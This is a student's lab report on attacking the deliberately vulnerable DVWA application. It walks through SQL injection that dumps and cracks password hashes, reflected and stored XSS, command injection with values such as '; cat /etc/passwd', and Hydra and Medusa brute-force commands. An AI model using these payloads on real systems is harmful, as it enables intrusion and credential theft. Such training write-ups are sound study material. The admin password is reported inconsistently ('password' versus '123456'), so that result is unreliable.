# Lab Report 03 — Web Application Hacking
**Author:** Frank Arhin  
**GitHub:** Frank-CyberSec  
**Date:** 03 May 2026  
**Classification:** Personal Lab — Educational Purposes Only  

---

## 1. Executive Summary

This report documents the findings of a web application penetration testing exercise conducted in a controlled virtual environment. The objective was to perform various web application attacks against DVWA (Damn Vulnerable Web Application) running on Metasploitable 2, using Kali Linux 2026.1 as the attacking platform. The exercise covers CEH v13 Domain 14 — Hacking Web Applications.

---

## 2. Lab Environment

| Component | Details |
|---|---|
| **Attacker Machine** | Kali Linux 2026.1 |
| **Target Machine** | Metasploitable 2 (Linux 2.6.24) |
| **Target IP** | 192.168.1.214 |
| **Web Application** | DVWA (Damn Vulnerable Web Application) |
| **Web Server** | Apache 2.2.8 |
| **Database** | MySQL 5.0.51a |
| **Security Level** | Low |
| **Hypervisor** | Oracle VirtualBox |
| **Network Type** | Bridged Adapter |

---

## 3. Methodology

The following web application attack phases were conducted:

1. SQL Injection — Database enumeration and credential extraction
2. Reflected XSS — Cookie stealing via JavaScript injection
3. Stored XSS — Persistent JavaScript injection with client side bypass
4. Command Injection — Operating system command execution via web form
5. Brute Force — Automated password guessing using Hydra and Medusa

---

## 4. Tools Used

| Tool | Purpose | CEH Domain |
|---|---|---|
| **Firefox Browser** | Web application testing | Domain 14 |
| **Browser Inspector** | Client side validation bypass | Domain 14 |
| **John the Ripper** | Password hash cracking | Domain 6 |
| **Hydra v9.6** | Automated brute force (attempted) | Domain 6 |
| **Medusa v2.3** | Automated brute force (successful) | Domain 6 |
| **SQL Injection** | Manual injection techniques | Domain 14 |
| **JavaScript** | XSS payload delivery | Domain 14 |

---

## 5. Findings

### 5.1 SQL Injection Attack

**Target:** http://192.168.1.214/dvwa/vulnerabilities/sqli/

**Attack Chain:**

#### Step 1 — Vulnerability Confirmation
**Payload Used:**
```sql
1' OR '1'='1
```
**Result:** All 5 database users returned instead of just 1 — vulnerability confirmed!

---

#### Step 2 — Database Version Extraction
**Payload Used:**
```sql
1' UNION SELECT null, version() #
```
**Result:**

| Finding | Detail |
|---|---|
| **Database** | MySQL |
| **Version** | 5.0.51a-3ubuntu5 |

---

#### Step 3 — Database Name Extraction
**Payload Used:**
```sql
1' UNION SELECT null, database() #
```
**Result:**

| Finding | Detail |
|---|---|
| **Database Name** | dvwa |

---

#### Step 4 — Table Enumeration
**Payload Used:**
```sql
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='dvwa' #
```
**Result:**

| Table Name | Significance |
|---|---|
| guestbook | Stores guestbook entries |
| **users** | Stores usernames and passwords |

---

#### Step 5 — Column Enumeration
**Payload Used:**
```sql
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #
```
**Result:**

| Column Name | Significance |
|---|---|
| user_id | Unique identifier |
| first_name | User first name |
| last_name | User last name |
| user | Username |
| **password** | Password hash |
| avatar | Profile picture |

---

#### Step 6 — Credential Extraction
**Payload Used:**
```sql
1' UNION SELECT user, password FROM users #
```
**Result:**

| Username | Password Hash |
|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

---

#### Step 7 — Password Cracking
**Command Used:**
```bash
john --format=raw-md5 dvwahashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
**Result:**

| Username | Cracked Password | Time to Crack |
|---|---|---|
| admin | password | < 1 second |
| gordonb | abc123 | < 1 second |
| pablo | letmein | < 1 second |
| 1337 | charley | < 1 second |
| smithy | password | < 1 second |

**All 5 passwords cracked in under 1 second!**

---

### 5.2 Reflected XSS Attack

**Target:** http://192.168.1.214/dvwa/vulnerabilities/xss_r/

#### Step 1 — Basic XSS Confirmation
**Payload Used:**
```javascript
<script>alert('XSS Attack by Frank!')</script>
```
**Result:** Alert popup appeared confirming XSS vulnerability!

---

#### Step 2 — Cookie Stealing
**Payload Used:**
```javascript
<script>alert(document.cookie)</script>
```
**Result:**

| Finding | Detail |
|---|---|
| **Security Level** | security=low |
| **Session Cookie** | PHPSESSID=46042809236f4b51fd0e74c5d66575b1 |

**Impact:** Session cookie extracted — could be used for session hijacking!

---

### 5.3 Stored XSS Attack

**Target:** http://192.168.1.214/dvwa/vulnerabilities/xss_s/

#### Step 1 — Client Side Validation Bypass
The message box had a maxlength restriction of 50 characters:
1. Right clicked the message box
2. Selected Inspect Element
3. Changed maxlength from **50** to **500**
4. Successfully bypassed the restriction!

#### Step 2 — Stored XSS Payload
**Payload Used:**
```javascript
<script>alert('Stored XSS Attack! Every user sees this!')</script>
```
**Result:** Script permanently stored in database — alert popup appeared for every user visiting the page!

---

### 5.4 Command Injection Attack

**Target:** http://192.168.1.214/dvwa/vulnerabilities/exec/

#### Attack 1 — Web Server User Identity
**Payload Used:**
```
192.168.1.214 ; whoami
```
**Result:** `www-data` — web server running as www-data user

---

#### Attack 2 — System Users Extraction
**Payload Used:**
```
192.168.1.214 ; cat /etc/passwd
```
**Result:** All system users extracted including root, msfadmin, postgres, user, service

---

#### Attack 3 — User Identity Details
**Payload Used:**
```
192.168.1.214 ; id
```
**Result:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

#### Attack 4 — File System Enumeration
**Payload Used:**
```
192.168.1.214 ; ls /
```
**Result:** Complete file system structure revealed including /root, /home, /etc, /var

---

### 5.5 Brute Force Attack

**Target:** http://192.168.1.214/dvwa/vulnerabilities/brute/

#### Tool 1 — Hydra (Attempted)
**Command Used:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.214 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie:security=low; PHPSESSID=46042809236f4b51fd0e74c5d66575b1"
```
**Result:** Failed due to strict cookie and form parameter formatting requirements in Hydra's http-get-form module

**Lesson Learned:** Hydra requires very precise syntax for cookie handling — colons inside cookie values conflict with Hydra's delimiter format

---

#### Tool 2 — Medusa (Successful)
**Command Used:**
```bash
medusa -h 192.168.1.214 -u admin -P /usr/share/wordlists/rockyou.txt -m DIR:/dvwa/vulnerabilities/brute/ -M http
```
**Result:**

| Finding | Detail |
|---|---|
| **Tool** | Medusa v2.3 |
| **Target** | 192.168.1.214 |
| **Username** | admin |
| **Password Found** | 123456 |
| **Time to Crack** | Less than 1 second |
| **Status** | SUCCESS ✅ |

---

#### Tool Comparison

| Feature | Hydra | Medusa |
|---|---|---|
| Cookie handling | Complex syntax required | Not needed for basic HTTP |
| HTTP form syntax | Very strict formatting | More flexible |
| Command complexity | High | Low |
| Result | ❌ Failed | ✅ Success |

**Key Lesson:** Always have multiple tools available — if one tool fails, try another!

---

## 6. Risk Assessment

| Vulnerability | Risk Level | Impact |
|---|---|---|
| SQL Injection | 🔴 Critical | Full database compromise |
| Reflected XSS | 🔴 High | Session hijacking possible |
| Stored XSS | 🔴 Critical | All users affected permanently |
| Client Side Bypass | 🟡 Medium | Input validation circumvented |
| Command Injection | 🔴 Critical | Full server OS access |
| Brute Force | 🔴 Critical | Admin account compromised in < 1 second |
| Weak Passwords | 🔴 Critical | All passwords cracked in < 1 second |
| MD5 Password Hashing | 🔴 Critical | Easily cracked hashing algorithm |

---

## 7. Recommendations

1. **Prevent SQL Injection** — Use parameterised queries and prepared statements
2. **Prevent XSS** — Sanitise and encode all user input before displaying
3. **Implement Server Side Validation** — Never rely on client side validation alone
4. **Prevent Command Injection** — Never pass user input directly to OS commands
5. **Implement Account Lockout** — Lock accounts after 3-5 failed login attempts
6. **Use CAPTCHA** — Prevent automated brute force attacks
7. **Use Strong Password Hashing** — Replace MD5 with bcrypt or Argon2
8. **Enforce Strong Passwords** — Minimum 12 characters with complexity requirements
9. **Implement Content Security Policy** — Restrict JavaScript execution sources
10. **Use HTTPS** — Encrypt all web traffic to prevent cookie theft
11. **Implement HttpOnly Cookies** — Prevent JavaScript from accessing session cookies
12. **Regular Security Testing** — Conduct periodic web application penetration tests

---

## 8. CEH v13 Domains Covered

| Domain | Topic | Demonstrated |
|---|---|---|
| Domain 6 | Password Cracking | ✅ MD5 hashes cracked with John the Ripper |
| Domain 6 | Brute Force | ✅ Admin password cracked with Medusa |
| Domain 11 | Session Hijacking | ✅ Session cookie extracted via XSS |
| Domain 14 | SQL Injection | ✅ Full database enumeration and dump |
| Domain 14 | Cross Site Scripting | ✅ Reflected and Stored XSS |
| Domain 14 | Command Injection | ✅ OS commands executed via web form |
| Domain 14 | Client Side Bypass | ✅ maxlength restriction bypassed |

---

## 9. OWASP Top 10 Vulnerabilities Demonstrated

| OWASP Rank | Vulnerability | Demonstrated |
|---|---|---|
| A03:2021 | Injection (SQL & Command) | ✅ Yes |
| A02:2021 | Cryptographic Failures (MD5) | ✅ Yes |
| A07:2021 | Cross Site Scripting (XSS) | ✅ Yes |
| A05:2021 | Security Misconfiguration | ✅ Yes |
| A07:2021 | Identification & Authentication Failures | ✅ Yes |

---

## 10. Conclusion

The web application penetration test of DVWA on Metasploitable 2 revealed multiple critical vulnerabilities across all tested modules. SQL Injection allowed complete database enumeration and credential extraction. XSS attacks successfully demonstrated cookie stealing and persistent script injection. Command Injection provided direct access to the underlying operating system. Brute force attacks using Medusa successfully cracked the admin password in under one second. The exercise also demonstrated the importance of tool selection in penetration testing — when Hydra failed due to syntax limitations, Medusa successfully completed the attack. These findings highlight the critical importance of secure coding practices, input validation, account lockout policies, and regular security testing.

---

## 11. References

- EC-Council CEH v13 Official Courseware
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- DVWA Documentation: https://github.com/digininja/DVWA
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- Hydra Documentation: https://github.com/vanhauser-thc/thc-hydra
- Medusa Documentation: http://foofus.net/goons/jmk/medusa/medusa.html
- CVE Database: https://cve.mitre.org

---

*This report was produced in a controlled lab environment for educational purposes only. All testing was conducted on machines owned and operated by the author.*
